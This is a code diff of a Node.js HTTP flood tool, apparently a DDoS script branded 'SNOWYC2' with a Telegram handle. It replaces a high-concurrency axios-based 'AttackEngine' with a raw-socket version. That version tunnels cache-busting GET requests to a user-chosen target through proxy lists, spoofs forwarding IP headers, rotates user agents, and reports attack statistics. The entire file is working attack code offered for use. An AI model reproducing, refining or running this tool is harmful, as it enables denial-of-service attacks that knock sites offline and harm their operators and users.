@@ -1,217 +1,137 @@
-const axios = require('axios');
 const fs = require('fs');
-const os = require('os');
 const http = require('http');
 const https = require('https');
-const process = require('process');
+const net = require('net');
+const url = require('url');
 
-const MAX_CONCURRENT = Math.min(os.cpus().length * 100, 5540);
-const REQUEST_TIMEOUT = 60000;
+const proxies = fs.readFileSync('proxies.txt', 'utf-8')
+    .split('\n')
+    .map(x => x.trim())
+    .filter(x => x);
 
-// Loaders
-function loadLines(filename) {
-    try {
-        return fs.readFileSync(filename, 'utf8')
-            .split('\n')
-            .map(line => line.trim())
-            .filter(line => line.length > 0);
-    } catch {
-        return [];
-    }
+const userAgents = fs.readFileSync('ua.txt', 'utf-8')
+    .split('\n')
+    .map(x => x.trim())
+    .filter(x => x);
+
+const referers = fs.readFileSync('refs.txt', 'utf-8')
+    .split('\n')
+    .map(x => x.trim())
+    .filter(x => x);
+
+const targetUrl = process.argv[2];
+const duration = parseInt(process.argv[3]) * 1000;
+
+if (!targetUrl || isNaN(duration)) {
+    console.log("Usage: node script.js <url> <time_in_seconds>");
+    process.exit(1);
 }
 
-// Load resources
-const REFERERS = loadLines('refs.txt');
-const USER_AGENTS = loadLines('ua.txt');
-const PROXIES = loadLines('proxies.txt');
+const parsed = url.parse(targetUrl);
+const host = parsed.hostname;
+const port = parsed.protocol === 'https:' ? 443 : 80;
 
-const UA_POOL = Array.from({ length: 10000 }, () =>
-    USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)] || 'Mozilla/5.0'
-);
+let success = 0;
+let fail = 0;
+let usedProxies = new Set();
 
-const keepAliveHttp = new http.Agent({ keepAlive: true });
-const keepAliveHttps = new https.Agent({ keepAlive: true });
-
-const USED_PROXIES = new Set();
-
-class AttackEngine {
-    constructor(target, duration) {
-        this.target = target;
-        this.duration = duration * 1000;
-        this.startTime = Date.now();
-        this.stats = {
-            total: 0,
-            success: 0,
-            errors: 0,
-            peakRps: 0
-        };
-        this.uaIndex = 0;
-        this.running = true;
-    }
-
-    getRandomUA() {
-        this.uaIndex = (this.uaIndex + 1) % UA_POOL.length;
-        return UA_POOL[this.uaIndex];
-    }
-
-    getRandomReferer() {
-        return REFERERS[Math.floor(Math.random() * REFERERS.length)] || 'https://google.com';
-    }
-
-    getRandomProxy() {
-        return PROXIES[Math.floor(Math.random() * PROXIES.length)];
-    }
-
-    async makeRequest() {
-        const randomIP = Array(4).fill(0).map(() => Math.floor(Math.random() * 255) + 1).join('.');
-        const headers = {
-            'User-Agent': this.getRandomUA(),
-            'Referer': this.getRandomReferer(),
-            'X-Forwarded-For': randomIP,
-            'X-Real-IP': randomIP,
-            'Accept': '*/*',
-            'Connection': 'keep-alive',
-            'Cache-Control': 'no-cache'
-        };
-
-        const urlWithNoise = this.target + (this.target.includes('?') ? '&' : '?') + `cb=${Math.random().toString(36).substring(2, 15)}`;
-        const isHttps = this.target.startsWith('https');
-        const fallbackAgent = isHttps ? keepAliveHttps : keepAliveHttp;
-
-        const proxyAddr = this.getRandomProxy();
-        let proxyUsed = false;
-
-        try {
-            if (proxyAddr) {
-                const [host, port] = proxyAddr.split(':');
-                await axios.get(urlWithNoise, {
-                    headers,
-                    timeout: REQUEST_TIMEOUT,
-                    proxy: {
-                        host,
-                        port: parseInt(port)
-                    },
-                    validateStatus: null
-                });
-                USED_PROXIES.add(proxyAddr);
-                proxyUsed = true;
-                this.stats.success++;
-            }
-        } catch {
-            try {
-                await axios.get(urlWithNoise, {
-                    headers,
-                    timeout: REQUEST_TIMEOUT,
-                    httpAgent: fallbackAgent,
-                    httpsAgent: fallbackAgent,
-                    validateStatus: null
-                });
-                this.stats.success++;
-            } catch {
-                this.stats.errors++;
-            }
-        }
-
-        this.stats.total++;
-    }
-
-    async startWorkers() {
-        const workers = [];
-        for (let i = 0; i < MAX_CONCURRENT; i++) {
-            workers.push(this.workerLoop());
-        }
-        await Promise.all(workers);
-    }
-
-    async workerLoop() {
-        while (this.running && Date.now() - this.startTime < this.duration) {
-            await this.makeRequest();
-        }
-    }
-
-    async runAttack() {
-        console.clear();
-        console.log('\n  SNOWYC2 - T.ME/STSVKINGDOM');
-        console.log('  ============================================');
-        console.log(`  TARGET: ${this.target}`);
-        console.log(`  TIME:   ${this.duration / 1000}s`);
-        console.log(`  MODE:   RAPID STRIKE - ${MAX_CONCURRENT} Concurrent`);
-        console.log('  LOADING PROXIES...');
-
-        // Give proxies time to "warm up"
-        await new Promise(res => setTimeout(res, 1500));
-
-        console.log('  ============================================\n');
-
-        let lastTotal = 0;
-        const printStats = setInterval(() => {
-            const elapsed = (Date.now() - this.startTime) / 1000;
-            const currentRps = (this.stats.total - lastTotal) / 0.2;
-            lastTotal = this.stats.total;
-            this.stats.peakRps = Math.max(this.stats.peakRps, currentRps);
-
-            process.stdout.write(
-                `\r  SENT: ${this.stats.total} | 200 OK: ${this.stats.success} | ERR: ${this.stats.errors} | RPS: ${currentRps.toFixed(1)} `
-            );
-        }, 200);
-
-        await this.startWorkers();
-        this.running = false;
-        clearInterval(printStats);
-        this.printSummary();
-    }
-
-    printSummary() {
-        const elapsed = (Date.now() - this.startTime) / 1000;
-        const avgRps = this.stats.total / elapsed;
-        console.log('\n\n  ATTACK FINISHED');
-        console.log('  ============================================');
-        console.log(`  TIME:        ${elapsed.toFixed(1)}s`);
-        console.log(`  TOTAL:       ${this.stats.total}`);
-        console.log(`  SUCCESS:     ${this.stats.success}`);
-        console.log(`  ERRORS:      ${this.stats.errors}`);
-        console.log(`  AVG RPS:     ${avgRps.toFixed(1)}`);
-        console.log(`  PEAK RPS:    ${this.stats.peakRps.toFixed(1)}`);
-        console.log('  PROXIES USED:');
-        if (USED_PROXIES.size > 0) {
-            for (let proxy of USED_PROXIES) {
-                console.log(`   - ${proxy}`);
-            }
-        } else {
-            console.log('   - None (VPS IP only)');
-        }
-        console.log('  ============================================\n');
-    }
+function getRandom(list) {
+    return list[Math.floor(Math.random() * list.length)];
 }
 
-// Main
-(async () => {
-    const readline = require('readline').createInterface({
-        input: process.stdin,
-        output: process.stdout
+function buildRequestHeaders(host) {
+    const ip = Array(4).fill(0).map(() => Math.floor(Math.random() * 255)).join('.');
+    const ua = getRandom(userAgents);
+    const ref = getRandom(referers);
+
+    return [
+        `GET ${parsed.path || '/'}?cb=${Math.random().toString(36).substring(7)} HTTP/1.1`,
+        `Host: ${host}`,
+        `User-Agent: ${ua}`,
+        `Referer: ${ref}`,
+        `X-Forwarded-For: ${ip}`,
+        `X-Real-IP: ${ip}`,
+        `Connection: close`,
+        `Accept: */*`,
+        `Accept-Encoding: gzip, deflate`,
+        `Accept-Language: en-US,en;q=0.9`,
+        `Pragma: no-cache`,
+        `Cache-Control: no-cache`,
+        '',
+        ''
+    ].join('\r\n');
+}
+
+async function attackThroughProxy(proxy) {
+    return new Promise((resolve) => {
+        const [proxyHost, proxyPort] = proxy.split(':');
+        const socket = net.connect(proxyPort, proxyHost);
+
+        socket.setTimeout(60000);
+        socket.on('connect', () => {
+            let connectReq = `CONNECT ${host}:${port} HTTP/1.1\r\nHost: ${host}\r\n\r\n`;
+            socket.write(connectReq);
+        });
+
+        socket.on('data', chunk => {
+            if (chunk.toString().includes('200')) {
+                usedProxies.add(proxy);
+                const tlsSocket = port === 443 ? require('tls').connect({
+                    socket: socket,
+                    servername: host,
+                    rejectUnauthorized: false
+                }, () => {
+                    tlsSocket.write(buildRequestHeaders(host));
+                }) : socket;
+
+                if (port === 80) {
+                    socket.write(buildRequestHeaders(host));
+                }
+
+                success++;
+                resolve();
+            } else {
+                fail++;
+                socket.destroy();
+                resolve();
+            }
+        });
+
+        socket.on('error', () => {
+            fail++;
+            socket.destroy();
+            resolve();
+        });
+
+        socket.on('timeout', () => {
+            fail++;
+            socket.destroy();
+            resolve();
+        });
     });
+}
 
-    const ask = (q) => new Promise(resolve => readline.question(q, resolve));
+async function startAttack() {
+    const end = Date.now() + duration;
+    const concurrency = 100;
 
-    const targetInput = await ask("TARGET: ");
-    let target = targetInput.trim();
-    if (!target.startsWith("http")) {
-        target = "http://" + target;
+    while (Date.now() < end) {
+        const jobs = [];
+        for (let i = 0; i < concurrency; i++) {
+            const proxy = getRandom(proxies);
+            jobs.push(attackThroughProxy(proxy));
+        }
+        await Promise.all(jobs);
+        process.stdout.write(`\rSent: ${success + fail} | 200 OK: ${success} | Fail: ${fail} | Used: ${usedProxies.size}`);
     }
 
-    const durationInput = await ask("TIME (sec): ");
-    readline.close();
+    console.log('\n\nAttack Complete cuh.');
+    console.log('======================================');
+    console.log('Success:', success);
+    console.log('Failed:', fail);
+    console.log('Unique Proxies Used:', usedProxies.size);
+    console.log('Proxies Used:');
+    console.log([...usedProxies].join('\n'));
+}
 
-    const duration = parseInt(durationInput);
-    if (isNaN(duration)) {
-        console.log("Invalid time input.");
-        return;
-    }
-
-    const engine = new AttackEngine(target, duration);
-    try {
-        await engine.runAttack();
-    } catch (err) {
-        console.error("Attack failed:", err.message);
-    }
-})();
+startAttack();
